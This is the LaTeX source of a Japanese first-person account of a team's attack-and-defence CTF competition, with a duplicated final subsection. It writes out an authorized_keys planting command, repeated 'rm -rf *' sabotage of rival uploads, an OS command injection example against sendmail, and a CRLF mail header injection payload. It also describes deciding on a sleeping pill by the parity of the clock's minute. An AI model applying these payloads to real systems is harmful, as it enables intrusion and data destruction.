$ ssh -i ~/.ssh/id_rsa.gomi stage4@10.0.2.3
\end{lstlisting}

トライ。

\begin{lstlisting}
Last login: Sat Feb 23 10:02:40 2013

Stage4 Keyword: IcouldLoginWithSSHd

[satge4@localhost ~]$
\end{lstlisting}

勝った。
このキーワードは既におーぴーが書き込んだらしい。
しかし謎なのは、

「おーぴー、どうやって\ctt{authorized\_keys}に書き込んだ?」

「Fiddler\footnote{プロクシのように振る舞うWebデバッガー。}を使った」

なるほど。
俺みたいに文字列を直接アドレスバーに入力するような、
古典的な手法はもうダメってことだな。
まあともかく、これで俺もサーバーの住人だ。

しかし、ここに来てログインしているのは俺とおーぴーだけ。
チームの全員でこのサーバーを調べた方が良いだろう。
とりあえず、他のメンバーに手早く\ctt{gomi.php}の使い方を説明した。

まあ、事前にCOINSの環境でこの話はしたことがある。
COINSの環境はPHPが\ctt{\_www}の権限で動いているので、
PHPから、つまりはApacheから参照出来る情報は全て他のユーザーが取得出来る。
故に、PHPがデータベースにアクセスするための情報や、
Apacheの設定ファイルである\ctt{.htpasswd}なども閲覧出来る。
という話を\urandomの皆には事前にしてあるので、これはCOINS環境の応用問題だ。
簡単に分かるはず。

しかし、

「\ctt{gomi.php}でInternal Server Error出るんだけど……」

おしろが言う。
どういうことだ?
とにかく調べてみるか。
ドキュメントルートはどこだか不明だが、まあ恐らく
\ctt{/var/www/}の下の何処か。
ここで\ctt{ls}を発砲。

\begin{lstlisting}
[stage4@localhost ~]$ cd /var/www
[stage4@localhost www]$ ls
DB  cgi-bin  error  html  icons
\end{lstlisting}

この中で可能性が最も高そうなのは\ctt{html}だ。
となると、\ctt{gomi.php}があるのは\ctt{html/stage3xYz/image/}ということだ。
とりあえずそこで\ctt{ls}を撃つ。

\begin{lstlisting}
[stage4@localhost images]$ ls
gomi.php index.html a.php hogehoge.cgi key.png test.php gomi.php attack.php 
\end{lstlisting}

なんだこれは?
俺がアップロードした覚えのないファイルが大量に……。
おーぴーなどが適当にアップロードしたにしては、流石に多過ぎだ。
もしかして、これ、あらゆるチームが同じサーバーへ攻撃しているのか?
ならば俺のやるべきことは、

\begin{lstlisting}
[stage4@localhost images]$ rm -rf *
rm: cannot remove `index.html': Permission Denied.
\end{lstlisting}

そして、\ctt{ls}を再度。

\begin{lstlisting}
[stage4@localhost images]$ ls
index.html
\end{lstlisting}

よし、ゴミどもは削除した。
この\ctt{index.html}は大会側が用意したものだろうから、
何か強いパーミッションで保護されているに違いない。
それ以外のファイル、例えば\ctt{gomi.php}など、
\ctt{stage4}の権限でなんとか出来るファイルについては壊滅だ。

敵チームがこのサーバーへログインするには、
俺の置いたようなスクリプトを設置し、
\ctt{authorized\_keys}へ公開鍵を書き込む以外にないだろう。
だがここで俺が立て籠り、アップロードされたファイルをことごとく削除したら、
当然敵チームが公開鍵\ctt{authorized\_keys}へ書き込むのは困難になるだろう。
だからひたすら\ctt{rm -rf *}を連打だ。
これで俺の置いた\ctt{gomi.php}も破滅したが、もはやあんなものは必要ない。
少くとも俺とおーぴーの公開鍵が\ctt{authorized\_keys}に登録されている以上、
我々が残りのメンバーの公開鍵をUSBメモリか何かで受け取り、書き込めばよい。

とりあえず、おしろの公開鍵を登録せねば。
既にログインしていためいす\footnote{情報科学類二年次、クラス代表者の一人。}に事情を話し、
\ctt{rm -rf *}を連打してもらうことにした。
めいすは今回の全国大会から\urandomに参加した人間で、C\#やRubyを使ってプログラムを書く人間だ。

おしろはおーぴーが所持していたUSBメモリに自前の公開鍵を入力して俺に渡す。
それを受けとり、手早く書き込む。

\end{multicols}

\begin{lstlisting}
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDHqTaybkv0pI53h5HEZxj8Mz0i4SfWIWTp0RpABgyJDloyKCv4YkX3/u1
k4eW4vuDD9wje1zLbnLl3cX/Elvh4NeQ8MMXwZSJqZrShDEpfqkkYlhIVWsNbui9JRSmeTVSbQiJIdb6tc6NYTlyujp/f/5BumqKUn
RY1WE9BNz9sbc6vm4MA1eU33j7HQGD2xYDc7fHks8Fy7NwdDjrfm4CZEpxhrur4HL8CQAEvNAa7xaLWOwqbDxJlo3eVKCtzrCSSje4
HZ41AoNUbHf7PKznv2cwSWP5z5MIfVvvoZsRmtxbVG4UEN0pA578uo8rIRq87z6MZ8LQ7usXweUsGuZr favcasle@ubuntu
>> /home/stage4/.ssh/authorized_keys
\end{lstlisting}

\begin{multicols}{2}

他のメンバーの公開鍵はおーぴーが処理したらしい。
俺はめいすから削除する役割を代ってもらい、
めいすにはこの作業をシェルスクリプトか何かで自動化してもらう。

% vimexec: let g:tex_no_math = 0
% vimexec: syntax off
% vimexec: syntax on
% vimexec: source ~/.gvimrc

\subsection{}
編集部でメールサーバーの用意を済ませて帰宅する。
真円の月光で明るい夜を自転車で走りながら、
そろそろ抗ヒスタミン剤を用意せねばならんなどと思う。

薬といえば、今日はハルシオン\footnote{睡眠導入剤のこと。}%
を入れようか迷うな。
ハルシオンはナイフみたいに切れ味のある鋭利な睡眠導入剤だと思うけど、
時々サイドエフェクトなのか次の日が鉛みたいに眠い時がある。
大学の授業であれば眠くても問題ないのでそのまま適当に服用するのだけど、
明日は全国大会の二日目なので、そういうわけにもいかない。
ただ、あの眠気は前に使っていたエビリファイ\footnote{抗不安薬・向精神薬として使われる薬のこと。}%
の副作用なのかもしれない。
いずれにしても最悪の場合、アラームでも起床出来ぬ程に昏睡してそのまま二日目を寝過ごすという可能性もある故、
今日はやはり入れない方がいいかもしれないな。
しかしこういう肝心な時に使えないというか、
使用を躊躇させるような副作用があるハルシオンはちょっと危ないな。
最近はロゼレム\footnote{睡眠導入剤のこと。}を貰っているが、
これは正直睡眠導入剤としてはイマイチで、
先生が言っていたように体内リズムを改善するサプリメントみたいな感じだ。
やはり今度はマイスリー\footnote{睡眠導入剤のこと。}あたりに挑戦してもいいかもしれない。

脳内会議で今日のハルシオン使用を止める判断を下した頃に家へ到着した。
適当にシャワーを浴びるなどして寝るための支度を整える。
そして、ハルシオンは入れずロゼレムとセディール\footnote{抗不安薬のこと。}だけ服用して布団に入る。
携帯電話のアラームを設定して寝ようとする。
だいたい思った通りだけど、こういう重要な予定があるような時というのは寝られない。
どうしようかな、ハルシオン、やっぱり入れとこうかな。
だけどハルシオンは変な時間にいれると体内リズムが破壊されるような印象があるから、
入れるならなるべく早いうちに決断したい……。
こういう時は神の決断を仰ぐしかあるまい。
今時間を確認して「分」が偶数か奇数かで入れるか入れないかを決定しよう。

よし、決した。
偶数であれば入れる、奇数であれば入れず。
脇に置いてある携帯電話の電源ボタンを押して、時間をチェックする。
結果は0時14分、偶数によりハルシオンの導入が決定された。
神の仰せの通りに俺はハルシオンを追加で飲み、眠ることにした。
仮に明日眠気が残ったとしても、会場にたくさん用意してあったエナジードリンクでかき消せばよい。
ハルシオンとカフェンインのどちらが強いか、確かめるいい機会となるだろう。

\subsection{}
\Mercuryは安定運用の時期に入った。
このフラッグワードというものは一度書き込むと、
ポイントが一発入って終わりというものではないらしい。
ゆにゃによると、5分ごとに変化するフラッグワードを変わる度にFLAGへ書き込むことで20ポイントになるそうだ。
キーワードのコミットが100ポイント程度なので、20分でキーワード一個に相当することになる。

今のところCTFの問題が\Mercuryしかないのも\urandomにとってはありがたい。
FLAGを取得しているのは\urandomしかいないのだから、
他のチームも\urandomが妨害工作をしていると薄々気づいているかもしれない。
しかし、妨害をしていると知っていても他に解く問題がないのだから仕方ない。
それに妨害していると知っているのは妨害をしている我々だけだ。
他のチームにとっては、アップローダーが正しく動作しないのが、
あるいはSSHへ接続すると瞬時に切断されるのが単なるCTFの仕掛けなのか、
それとも敵チームの工作なのか判断出来ない。
つくば大会などは問題を解く度に加点というシステムであったので、
序盤多少出遅れたところで最後に点を取りまくれば逆転もありえた。
しかし全国大会のシステムではFLAGを取ればまず城下町から税金を5分ごとに搾取出来、
さらに城の設備を使って敵チームからFLAGを防衛出来る。
この一石二鳥システムによって敵チームはFLAGが取れず、
こちらは税金で単調増加。

「あれ?このアップローダー、消えるんだけど」

\EDの島から飛んできた声を盗み聞く。
彼らも恐らく、本当は俺なんかが太刀打ち出来るような相手じゃないのだろう。
しかし、彼らは多分初動をしくじった。
ネットワーク機器の故障とか、コンピュータの設定ミスとか、
あるいはJohn The Ripperを持っていなかったとか。
理由は様々考えられるが、とりあえず彼らは最初のあたりで\ruby{躓}{つまず}いた。
それが致命的で、\Mercuryはもはや俺達が侵入した時とは難易度が遥かに異なる別の物体になった。
こんな簡単に、優勝候補が墜ちるなんて。
俺達なんて、新聞に一文字たりとも載らなかったのに。
%JOI\footnote{情報オリンピックのこと。}にも未踏\footnote{情報処理推進機構が実施する未踏IT人材発掘・育成事業のこと。}%
%にも通ってない、平均点を這うように生きている俺みたいな人間を擁するチームに\EDが遅れをとったなんて。

大会が始まって数時間、
俺が掲げた目標を達成してしまった。
なんか、あっけないな。
天皇人間宣言みたいに、
今まで神だと思っていたものが突然人間になったみたいにあっけない。
などと油断すると背後から刺されるのかもしれないが。


\subsection{}
\Mercuryを占拠してからしばらく経ち、
その間にあらゆる作業が自動化されたため、
もはや俺がやることはなくなった。
新たな問題\Uranusが追加されたが、これはネットワーク系の問題で俺が出る幕はなさそうだ。
おーぴー達が\Uranusを目指して出陣した。

そうしている間に新たなWeb系の問題が出現した。
\Marsという名前がついたその問題は、
\Mercuryと同様に\url{http://10.0.2.5/FLAG}というURLだけが示されており、
アクセスすると「\ctt{a}」とだけ書かれたテキストファイル。
これは何か意味があってこうしているのか、
または何らかのミスでこうなってしまったのかは分からない。
とにかくこんなファイルを見ていても仕方がないので、
\Mercuryと同様に\url{http://10.0.2.5/}へアクセスする。
「\ctt{here}」というリンクのみが書かれたWebページが出現したので、
とりあえずそれをクリックすると、\url{http://10.0.2.5/message.html}というURLへ飛ばされた。
「Message Form」と太字で書かれたそのサイトには、

\begin{itemize}
	\item \ctt{Your Name}
	\item \ctt{Mail address}
	\item \ctt{Comment To}
	\item \ctt{Comments}
\end{itemize}

という4つの入力フォームがある。
そのうち\ctt{Comment To}は選択式になっており、

\begin{itemize}
	\item \ctt{Tech Support}
	\item \ctt{Administrator}
	\item \ctt{Customer Support}
	\item \ctt{Other Support}
\end{itemize}

から選ぶ形になっている。

とりあえず、全てを適当に入力して送信する。
10秒か20秒くらい経ってから、次のようなページがやって来た。

\begin{itembox}[c]{\textbf{Message Content:}}
Sent Your Comment. ThankYou!

\underline{return}. 
\end{itembox}

とりあえずソースでも見るか。

\lstinputlisting[style=html]{src/2/message.cgi}

まあ、これは疑いの余地なくメールの送信フォームだろう。
ページ遷移に死ぬ程時間がかかっていたのは、
恐らく\ctt{sendmail}か何かの外部プログラムを使ったからに違いない。
となると、\Marsはまず間違いなくOSコマンドインジェクションか、メールヘッダ汚染の二者択一。
とりあえず、送信フォームのソースを調べるか。

\lstinputlisting[style=html]{src/2/message.html}

このソースコード、まずは19行目だが、

\begin{lstlisting}[style=html, firstnumber=19]
<select name="mail_to">
\end{lstlisting}

となっていることからみて、
やはり間違いなくこれはメールを送信するWebアプリケーションだろう。
この\ctt{message.html}、8行目の\ctt{form}タグで\ctt{action}を次のようにしている。

\begin{lstlisting}[style=html, firstnumber=8]
<FORM ACTION="/cgi-bin/message.cgi" ......
\end{lstlisting}

送信先のプログラムが拡張子\ctt{.cgi}であること、
さらには\ctt{cgi-bin}という伝統的なパスにあることを考えても、
この\ctt{message.cgi}はPerlで書かれたプログラムである可能性が高い。
そういう場合、たぶん\ctt{message.cgi}はこんな感じ。

\lstinputlisting[style=perl]{src/2/mes_guess1.cgi}

そして\ctt{mail\_to}クエリに何か、例えば次のようなものを差し込むのが
OSコマンドインジェクションだ。

\begin{lstlisting}
hoge@hoge.jp; ls
\end{lstlisting}

すると、俺の考えた\ctt{message.cgi}においては9行目、
\ctt{sendmail}に渡す一連のコマンドが次のようになる。

\begin{lstlisting}
/usr/sbin/sendmail -t hoge@hoge.jp; ls
\end{lstlisting}

セミコロンは複数のコマンドを区切る働きがあるので、
この例では\ctt{sendmail}と意図しない\ctt{ls}が実行されることになる。
しかし、今回はそう簡単に物事が進みそうにない。
何故なら肝心要の\ctt{mail\_to}の選択肢は、

\begin{lstlisting}[style=html, firstnumber=20]
<option value="tech">Tech Support</option>
<option value="support">Administrator</option>
<option value="customer">Customer Support</option>
<option value="other">Other Support</option>
<!-----  <option value="maintain">Maintainance</option> ----->
\end{lstlisting}

となっている。
この不気味にコメントアウトされた\ctt{Maintainance}というのが気になるが、
それよりも問題なのはこいつらの\ctt{value}だ。
コメントアウトされた\ctt{Maintainance}も含めて列挙するとこうなる。

\begin{itemize}
	\item \ctt{tech}
	\item \ctt{support}
	\item \ctt{customer}
	\item \ctt{other}
	\item \ctt{maintain}
\end{itemize}

どいつもこいつもメールアドレスには見えない故、
これは内部にテーブルか何かを持っていると考えるのが妥当だ。
つまり\ctt{message.cgi}は、

\lstinputlisting[style=perl, firstnumber=6]{src/2/mes_guess2.cgi}

という感じで\ctt{\$mail\_to}を決定している可能性が高い。
よって、これでは\ctt{mail\_to}にOSコマンドを仕込むのは不可能だ。

となると……次はメールヘッダ汚染だ、が……。
それはそれで問題がある。
というのもこれは最終的な目標がFLAGファイルへの書き込み故、
メールヘッダに何か汚染を仕掛けたところでFLAGへ到達出来ないのではないか。
また、メールヘッダ汚染は例えば、

\begin{lstlisting}[style=perl]
my $subject = $q->param('subject');

print $mh "Subject: $subject\n\n";
\end{lstlisting}

などとしてあるプログラムに対して、
\ctt{\$subject}に、

\begin{lstlisting}[mathescape]
hogehoge%0D%0A$\normalfont\footnotemark$Bcc: hoge@some.addr
\end{lstlisting}
\footnotetext{\ctt{\%0D}、\ctt{\%0A}はそれぞれ\textbackslash\ctt{r}と\textbackslash\ctt{n}であり、改行をURLエンコードしたもの。}

といったものを注入することで、生成されるメールヘッダを

\begin{lstlisting}
Subject: hogehoge
Bcc: hoge@some.addr
\end{lstlisting}

という感じに改竄することでメールの送信先などを変更する攻撃だ。
現実の世界であれば、
\ctt{message.cgi}ようなメールを送信するプログラムは確実にインターネットへ接続されている。
しかし\Marsは競技という性質上、
外部のインターネットに接続されているのか分からない。
競技とはいえ、脆弱性のあるシステムをあえて作っているわけで、
そういうシステムを外部に公開するというのは考えにくいのではないか。
つまり競技という性質上の兼ね合いからも、メールヘッダ汚染は考えにくい。

が、他にまともな策もない。
競技の性質を勝手に決めつけてしまうのも良くない。
とりあえず試してみるか。

とは言うものの、メールヘッダ汚染にはまだ障壁がある。
この\ctt{message.cgi}がどのようにメールヘッダを生成するのかを推測する必要がある。
おさらいすると、まずこの\ctt{message.cgi}が受け取るクエリは、

\begin{itemize}
	\item \ctt{Your Name (name)}
	\item \ctt{Mail address (email)}
	\item \ctt{Comment To (mail\_to)}
	\item \ctt{Comments (comments)}
\end{itemize}

\noindentの4つ。
括弧内が\ctt{input}タグや\ctt{select}タグで指定されている\ctt{name}だ。

この中で、
\ctt{mail\_to}は先ほどプログラムの中でテーブルを使って決定しているという推測がなされたので、
ここに何を仕込んでも意味はない。
次に明らかに除外出来るのは\ctt{comments}だ。
これはメールヘッダの後に来る本文へ書き出される可能性が高い。
残るは\ctt{name}と\ctt{email}だが、俺の読みでは多分\ctt{message.cgi}はこんな感じ。

\lstinputlisting[style=perl]{src/2/mes_guess3.cgi}

\columnbreak

俺もどこかの企業か何かが作ったメール送信フォームを使ったことがあるが、
こういう場合、大抵先方からは入力した自分のメールアドレス宛に返信が来る。
ならばこのようにユーザーが入力したメールアドレスをメールヘッダの\ctt{From}に書くことで、
メールを受けとった人間は、メールクライアントの返信機能で返事を出せるから便利、
ということになっていてもおかしくはない。
まあ、ひょっとしたら\ctt{name}と\ctt{email}を結合して、

\begin{lstlisting}[style=perl, firstnumber=12]
print $mh "From: $name<$email>\n";
\end{lstlisting}

となっている可能性もある。
しかし後ろに何があっても同じこと。
改行してしまえば問題はない。
いずれの場合であったとしても\ctt{email}に汚染を仕込めば良いということだ。
ということで、\ctt{email}に次のようなものを仕込む。

\begin{lstlisting}[mathescape]
hoge%0D%0ABcc: yuu@coins.tsukuba.ac.jp$\normalfont\footnotemark$%0D%0A
\end{lstlisting}
\footnotetext{このメールアドレスは架空のものです。}

これでCOINSのメールアドレスにメールが届けば一つ光明が見えるというものだが……。

% \Uranusについては、何もせずに傍観している間に、
% \ZxZや\wasamusumeなどがキーワード二つを取得し我々に迫るも、
% おーぴー達がキーワードを二つとってまた引き離す。


% vimexec: let g:tex_no_math = 0
% vimexec: syntax off
% vimexec: syntax on
% vimexec: source ~/.gvimrc


\subsection{}
とりあえず、直ちにメールが届くことはなかった。
まあ何かの理由で遅れているという可能性もあるので、
しばらく待機する他ない。
現在は\Marsの他に\Uranusや\Neptuneなどいくつかの問題が追加されているが、
Web系の問題以外を解く脳がないので仕方なく既に制圧した\Mercuryを哨戒する。
俺が\Marsにチャレンジしている間、\Mercuryはキーワードこそいくつか取られたものの、
FLAGは死守している。

ただ、\mofuppが\Uranusのキーワードを立て続けに二つ取って\urandomを脅かす。
\mofuppは横浜大会で準優勝したチームで、
おーぴーの調べによるとksnctf\footnote{Webに公開されたCTFのサイト。\url{http://ksnctf.sweetduet.info/}}%
の作者がいるという話だ。
ksnctfはおーぴーの勧めで少しやってみたが、正直言って全然分からなかった。
俺を基準に話を進めるのも極端だが、かなりレベルの高い人間が少なくとも一人は所属しているのだろう。

その後様々なチームが\Uranusを攻め立てて\urandomに迫るも、
すかさずおーぴー達が\Uranusのキーワードを2つとも取得し点差を戻す。
そして\Mercuryから得られる税収でじわりじわりと逃げる。

とりあえず\Mercuryの\ctt{authorized\_keys}を見ると、
もはや先ほどとは比べものにならない程に巨大なファイルになっていた。
やはり一秒ごとに\ctt{images}の中身を消すといっても、所詮は一秒ごとだ。
\ctt{wget}か何かそういうプログラムを使ってひたすらPHPファイルをアップロードし続けて、
アップロード予定のアドレスにひたすらF5を押し続ければいずれPHPファイルが実行されてしまうだろう。
とはいえ所詮はキーワードが一つ取られる程度だ。
%今\urandomは一位を独走状態、二位の集団に700ポイント程度の差をつけている。
キーワード一つ程度ならば問題はない。
\Mercuryからの税収で、そんなものは20分で処理出来る。

さてメールが届いたかどうかを確認しようか、などと思った時、
久しく聞いていなかった長いサイレン音が響く。

うっ……!
祗園精舎の鐘の声、
諸行無常の響きあり。
ついに\Mercuryの牙城を穿つものが来たか。

スコアを確認すると、どうやら\ZxZが\MercuryのFLAGに到達したらしい。
\ZxZは確かどこかの高専と筑駒の連中が混ったチームだったはず。
\EDと同様全員がキャンプ出身であり、横浜大会では三位だった。
\ZxZはちょっと覚えている、
USBの通信をキャプチャしたファイルからディスクイメージを再構築する
という異端な方法を取った人間がいたはずだ。
そして筑駒と言えばJOI。
確か、予選突破者が\ZxZにもいたような気がする。
全くどれだけデラックスなチームなんだか。

しかしおーぴーがプログラムでSSH接続を殺してるというのに、
彼らはどうやって侵入したのだろうか。

「フラッグワードで得られるポイントが減った」

ゆにゃが言う。

「20ポイントから10ポイントになっている」

これは……どうやら城下町が生み出す税は一定らしいな。
つまりフラッグワードを書き込むことによって得られるポイントは、
1チームしかいないのであれば20ポイント、2チームならば10ポイント、
$N$チームなら$\frac{20}{N}$ポイントという具合になっているのだろう。

その直後\MMAと\wasamusumeも\MercuryのFLAGに書き込む。
うっ、五分毎に20ポイントだったものが一瞬で5ポイントまで低下した。
くっ、これは痛いな。

\MMAはつくば大会で三位だった電通大のチームで、
\wasamusumeは確か横浜大会で優勝したチームだったはずだ。
\wasamusumeにはめいすの知り合いと思われる人間がいる。
TypeScriptを使うなどしてMicrosoftへの忠誠を示すめいすと同様に、
その知人というのもMicrosoft信者で、
横浜大会では当時ベータ版しかなかったWindows 8向けのバイナリファイルをその人が解析していた記憶がある。

やはり\wasamusumeや\MMAなど常連は強い。
しかし、
まだおーぴーとめいすの妨害プログラム、ゆにゃのフラッグワード書き込みという連携で三時間ほどかけて
営々蓄えた財産が800ポイントくらいある。
そう簡単に逆転などなかろう。

さて敵チームに這い寄られて精神力が低下する前に、
こちらがさらに点差を広げて敵の精神力を破壊したい所だ。
とりあえず先ほどメールヘッダ汚染を仕掛けた\Marsだが、
メールはまだ届いていない。
これは攻撃が失敗したと考えるしかあるまい。
となると、やはりメールヘッダ汚染は不可能なのであろうか。

「吉村君」

薄井くん\footnote{情報科学類二年次、ガチチャリ勢。}%
に話しかけられた。
彼もめいす同様この全国大会に合わせて追加したメンバーで、とりあえずLISP信者。

「今ポートスキャンしたんだけど、なんか22番ポートが開いてる」

22番といえばSSHだ。

「パスワード認証みたい」

聞き耳を立てていたおーぴーが追加する。
これは……メールヘッダ汚染の可能性が出てきたぞ。
今までの状況では仮にメールヘッダ汚染が成功したとしても、
その先どうやってFLAGに書き込めばいいのか見当がつかなかったが、
SSHがあるのであれば話は別だ。
つまり送信されるメールにSSHのユーザーとパスワードが付いていて、
そのメールをヘッダ汚染でこちらに引っ張ることでSSHにログイン出来るようになる。
そしてSSHでログインしてからは何か別の障壁が用意されている、というパターンだ。
占領している\Mercuryも途中からSSHを絡めていたし、これはワンチャンスあるはず。

だが先ほどの攻撃は失敗した。
これはメールヘッダ汚染の失敗とも考えられるが、
競技という性質上の問題ではないかという推論も出来る。
というのも競技故に、問題の置いてあるサーバー、つまりは\Marsを外部へ接続する訳にはいかなった。
しかしこの\ctt{message.cgi}にはメールヘッダ汚染の脆弱性があり、かつ\MarsはLANには接続されている。
従ってLAN内のどこか------例えば俺のコンピュータにメールサーバーを設置すればそこにメールが届くという可能性がありえる。
ただ問題は今\MarsのIPアドレスは\url{10.0.2.5}だが、
俺に割り振られたIPアドレスは\url{192.168.7.4}だ。
ネットワークのことはよく分からないが、こういうネットワーク構成で本当に到達出来るのだろうか。
それに俺はメールサーバーを構築した経験などないので、
どのようにすればいいのかさっぱり分からない。

仕方ない……。
一旦この手法は見送ろう。
明日までにメールサーバーを用意するしかあるまい。
メールのような一般的なシステムであれば、たぶんCPANなど様々な選択肢があるだろう。


\subsection{}
さて敵チームに這い寄られて精神力が低下する前に、
こちらがさらに点差を広げて敵の精神力を破壊したい所だ。
とりあえず先ほどメールヘッダ汚染を仕掛けた\Marsだが、
メールはまだ届いていない。
これは攻撃が失敗したと考えるしかあるまい。
となると、やはりメールヘッダ汚染は不可能なのであろうか。

「吉村君」

薄井くん\footnote{情報科学類二年次、ガチチャリ勢。}%
に話しかけられた。
彼もめいす同様この全国大会に合わせて追加したメンバーで、とりあえずLISP信者。

「今ポートスキャンしたんだけど、なんか22番ポートが開いてる」

22番といえばSSHだ。

「パスワード認証みたい」

聞き耳を立てていたおーぴーが追加する。
これは……メールヘッダ汚染の可能性が出てきたぞ。
今までの状況では仮にメールヘッダ汚染が成功したとしても、
その先どうやってFLAGに書き込めばいいのか見当がつかなかったが、
SSHがあるのであれば話は別だ。
つまり送信されるメールにSSHのユーザーとパスワードが付いていて、
そのメールをヘッダ汚染でこちらに引っ張ることでSSHにログイン出来るようになる。
そしてSSHでログインしてからは何か別の障壁が用意されている、というパターンだ。

だが先ほどの攻撃は失敗した。
これはメールヘッダ汚染の失敗とも考えられるが、
どちらかと言えば競技という性質上の問題ではないかという推論も出来る。
というのも競技故に、問題の置いてあるサーバー、つまりは\Marsを外部へ接続する訳にはいかなった。
しかしこの\ctt{message.cgi}にはメールヘッダ汚染の脆弱性があり、かつ\MarsはLANには接続されている。
従って、どこかLAN内にメールサーバーを設置すればそこにメールが届くという可能性がありえる。
ただ問題はある。
今サーバーのIPアドレスは\url{10.0.2.5}だが、
俺に割り振られたIPアドレスは\url{192.168.7.4}だ。
ネットワークのことはよく分からないが、こういう構成で本当に到達出来るのだろうか。
それに俺はメールサーバーを構築した経験などないので、
どのようにすればいいのかさっぱり分からない。

仕方ない……。
一旦この手法は見送ろう。
明日までにメールサーバーを用意するしかあるまい。
メールのような一般的なシステムであれば、たぶんCPANなど様々な選択肢があるだろう。


\end{multicols}


\end{document}
